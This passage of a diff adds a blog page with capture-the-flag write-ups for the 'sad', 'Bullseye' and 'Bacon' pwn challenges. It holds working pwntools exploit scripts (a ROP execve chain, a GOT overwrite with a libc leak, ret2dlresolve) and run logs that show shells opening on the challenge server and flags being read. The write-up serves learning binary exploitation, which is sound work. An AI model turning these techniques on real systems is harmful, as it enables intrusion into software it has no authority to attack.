+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">syscall</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># The execve syscall payload: execve(bss, 0, 0)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">bss</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rsi</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdx</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rax</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">syscall</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Sedding `/bin/sh` and then the execve syscall will </span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>Running the exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[07:44:40]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">pwn</span><span class="err">&gt;</span> <span class="no">python3</span> <span class="no">sad.py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Opening</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">jh2i.com</span> <span class="no">on</span> <span class="no">port</span> <span class="mi">50002</span><span class="p">:</span> <span class="no">Done</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">ls</span>
+</span></span><span class="line"><span class="cl"><span class="nf">flag.txt</span>
+</span></span><span class="line"><span class="cl"><span class="nf">sad</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">cat</span> <span class="no">flag.txt</span>
+</span></span><span class="line"><span class="cl"><span class="nf">flag</span><span class="err">{</span><span class="no">radically_statically_roppingly_vulnerable</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Interrupted</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Closed</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">jh2i.com</span> <span class="no">port</span> <span class="mi">50002</span>
+</span></span></code></pre></div><blockquote>
+<p>Reference: <a href="https://pwning.tech/2020/03/09/zer0pts-hipwn/" target="_blank" rel="noreferrer">https://pwning.tech/2020/03/09/zer0pts-hipwn/</a></p>
+</blockquote>
+<h1 id="bullseye" class="relative group">Bullseye <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#bullseye" aria-label="Anchor">#</a></span></h1><p>This challenge was quite good and I liked it, it provided us a write-what-where primitive as a service and since the binary has Partial RELRO which means GOT entry was writeable, such a handy information. It was also leaking the alarm libc address which made it simple for us to get LIBC address by searching it ftro libc database.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">CTF</span><span class="err">/</span><span class="no">hacktivitycon</span><span class="err">/</span><span class="no">pwn</span><span class="err">/</span><span class="no">bullseye</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x400000</span><span class="p">)</span>
+</span></span></code></pre></div><p>Exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">from</span> <span class="no">roppy</span> <span class="no">import</span> <span class="p">*</span>
+</span></span><span class="line"><span class="cl"><span class="nf">from</span> <span class="no">time</span> <span class="no">import</span> <span class="no">sleep</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># flag{one_write_two_write_good_write_bad_write}
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nf">HOST</span> <span class="err">=</span> <span class="err">&#34;</span><span class="no">jh2i.com</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">PORT</span> <span class="err">=</span> <span class="mi">50031</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">libc</span> <span class="err">=</span> <span class="no">ELF</span><span class="p">(</span><span class="err">&#34;</span><span class="no">libc6_2.30-0ubuntu2.1_amd64.so</span><span class="err">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">exit_got</span>  <span class="err">=</span> <span class="err">&#34;</span><span class="mi">0x404058</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">sleep_got</span> <span class="err">=</span> <span class="err">&#34;</span><span class="mi">0x404060</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">main</span>      <span class="err">=</span> <span class="err">&#34;</span><span class="mi">0x401260</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">read_got</span>  <span class="err">=</span> <span class="err">&#34;</span><span class="mi">0x404038</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">p</span> <span class="err">=</span> <span class="no">remote</span><span class="p">(</span><span class="no">HOST</span><span class="p">,</span> <span class="no">PORT</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">def</span> <span class="no">send_data</span><span class="p">(</span><span class="no">where</span><span class="p">,</span> <span class="no">what</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">p.sendlineafter</span><span class="p">(</span><span class="err">&#34;?\</span><span class="no">n</span><span class="err">&#34;</span><span class="p">,</span> <span class="no">where</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">p.sendlineafter</span><span class="p">(</span><span class="err">&#34;?\</span><span class="no">n</span><span class="err">&#34;</span><span class="p">,</span> <span class="no">what</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">send_data</span><span class="p">(</span><span class="no">exit_got</span><span class="p">,</span> <span class="no">main</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">sleep</span><span class="p">(</span><span class="mi">0xf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">alarm</span> <span class="err">=</span> <span class="no">int</span><span class="p">(</span><span class="no">p.recvline</span><span class="p">().</span><span class="no">strip</span><span class="p">(</span><span class="no">b</span><span class="err">&#34;\</span><span class="no">n</span><span class="err">&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">log.info</span><span class="p">(</span><span class="err">&#34;</span><span class="no">alarm</span><span class="p">:</span>  <span class="mi">0</span><span class="no">x</span><span class="nv">%x</span><span class="err">&#34;</span> <span class="err">%</span><span class="p">(</span><span class="no">alarm</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nf">libc.address</span> <span class="err">=</span> <span class="no">alarm</span> <span class="p">-</span> <span class="no">libc.function</span><span class="p">(</span><span class="err">&#34;</span><span class="no">alarm</span><span class="err">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">log.info</span><span class="p">(</span><span class="err">&#34;</span><span class="no">LIBC</span>  <span class="p">:</span>  <span class="mi">0</span><span class="no">x</span><span class="nv">%x</span><span class="err">&#34;</span> <span class="err">%</span><span class="p">(</span><span class="no">libc.address</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nf">log.info</span><span class="p">(</span><span class="err">&#34;</span><span class="no">system</span><span class="p">:</span>  <span class="mi">0</span><span class="no">x</span><span class="nv">%x</span><span class="err">&#34;</span> <span class="err">%</span><span class="p">(</span><span class="no">libc.function</span><span class="p">(</span><span class="err">&#34;</span><span class="no">system</span><span class="err">&#34;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="nf">send_data</span><span class="p">(</span><span class="no">sleep_got</span><span class="p">,</span> <span class="no">main</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">send_data</span><span class="p">(</span><span class="err">&#34;</span><span class="mi">0x404040</span><span class="err">&#34;</span><span class="p">,</span> <span class="no">hex</span><span class="p">(</span><span class="no">libc.function</span><span class="p">(</span><span class="err">&#34;</span><span class="no">system</span><span class="err">&#34;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">p.interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>Running the exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[07:40:13]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">pwn</span><span class="err">&gt;</span> <span class="no">python3</span> <span class="no">bullseye.py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Analyzing</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">hacktivity</span><span class="err">/</span><span class="no">pwn</span><span class="err">/</span><span class="no">libc6_2.30-0ubuntu2.1_amd64.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Opening</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">jh2i.com</span> <span class="no">on</span> <span class="no">port</span> <span class="mi">50031</span><span class="p">:</span> <span class="no">Done</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nl">alarm:</span>  <span class="err">0</span><span class="nf">x7fbca7ea8be0</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">LIBC</span>  <span class="p">:</span>  <span class="mi">0x7fbca7dc3000</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nl">system:</span>  <span class="err">0</span><span class="nf">x7fbca7e184e0</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Paused</span> <span class="p">[</span><span class="no">Press</span> <span class="no">any</span> <span class="no">key</span> <span class="no">to</span> <span class="no">continue</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
+</span></span><span class="line"><span class="cl"><span class="nf">You</span> <span class="no">have</span> <span class="no">one</span> <span class="no">write</span><span class="p">,</span> <span class="no">don</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">miss.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">Where</span> <span class="no">do</span> <span class="no">you</span> <span class="no">want</span> <span class="no">to</span> <span class="no">write</span> <span class="no">to</span><span class="err">?</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">cat</span> <span class="no">flag.txt</span>
+</span></span><span class="line"><span class="cl"><span class="nf">flag</span><span class="err">{</span><span class="no">one_write_two_write_good_write_bad_write</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">exit</span>
+</span></span><span class="line"><span class="cl"><span class="nl">sh:</span> <span class="err">2:</span> <span class="err">�@:</span> <span class="nf">not</span> <span class="no">found</span>
+</span></span><span class="line"><span class="cl"><span class="nf">What</span> <span class="no">do</span> <span class="no">you</span> <span class="no">want</span> <span class="no">to</span> <span class="no">write</span><span class="err">?</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Got</span> <span class="no">EOF</span> <span class="no">while</span> <span class="no">reading</span> <span class="no">in</span> <span class="no">interactive</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Interrupted</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Closed</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">jh2i.com</span> <span class="no">port</span> <span class="mi">50031</span>
+</span></span></code></pre></div><h1 id="bacon" class="relative group">Bacon <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#bacon" aria-label="Anchor">#</a></span></h1><p>This is quite a good challenge. We were given a binary and it had a stackoverflow vulnerability, the program was:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1036</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">1056</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Although, it had stackoverflow vulnerability I couldn&rsquo;t get to understand how to pwn this, since there wasn&rsquo;t anything to leak any address so the ret2libc was out of option here, then I thought of ret2dl_resolve, this technique I learned about does not require any address leak, it will exploit the <code>dl_runtime_resolve</code> to exploit the link map of the functions. Using pwntools&rsquo;s ROP module, it was a piece of cake.</p>
+<p>Exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;jh2i.com&#34;</span><span class="p">,</span> <span class="mi">50032</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s2">&#34;bacon&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;bacon&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">dlresolve</span> <span class="o">=</span> <span class="n">Ret2dlresolvePayload</span><span class="p">(</span><span class="n">elf</span><span class="p">,</span> <span class="n">symbol</span><span class="o">=</span><span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">dlresolve</span><span class="o">.</span><span class="n">data_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span><span class="o">.</span><span class="n">ret2dlresolve</span><span class="p">(</span><span class="n">dlresolve</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">raw_rop</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">1036</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">raw_rop</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">dlresolve</span><span class="o">.</span><span class="n">payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>Running the exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[07:39:10]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">pwn</span><span class="err">&gt;</span> <span class="no">python3</span> <span class="no">bacon.py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Opening</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">jh2i.com</span> <span class="no">on</span> <span class="no">port</span> <span class="mi">50032</span><span class="p">:</span> <span class="no">Done</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">hacktivity</span><span class="err">/</span><span class="no">pwn</span><span class="err">/</span><span class="no">bacon</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">i386-32-little</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x8048000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Loading</span> <span class="no">gadgets</span> <span class="no">for</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">hacktivity</span><span class="err">/</span><span class="no">pwn</span><span class="err">/</span><span class="no">bacon</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Paused</span> <span class="p">(</span><span class="no">press</span> <span class="no">any</span> <span class="no">to</span> <span class="no">continue</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">ls</span>
+</span></span><span class="line"><span class="cl"><span class="nf">bacon</span>
+</span></span><span class="line"><span class="cl"><span class="nf">flag.txt</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">cat</span> <span class="no">flag.txt</span>
+</span></span><span class="line"><span class="cl"><span class="nf">flag</span><span class="err">{</span><span class="no">don</span><span class="err">&#39;</span><span class="no">t_forget_to_take_out_the_grease</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Interrupted</span>
+</span></span></code></pre></div><blockquote>
+<p>Reference: <a href="https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62" target="_blank" rel="noreferrer">https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62</a></p>
+</blockquote>
+<p>That was it, I wish I did space too. But I couldn&rsquo;t, so I am gonna do it later today as I took some help from someone who did the challenge. In case, you need help just message me on twitter.</p>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/ret2csu/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >ret2csu - A Return Oriented Programming Technique</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2020-04-13 00:00:00 &#43;0000 UTC">13 April 2020</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/dream-diary-chapter-1/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HTB Pwn - Dream Diary Chapter: 1</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2020-10-19 00:00:00 &#43;0000 UTC">19 October 2020</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
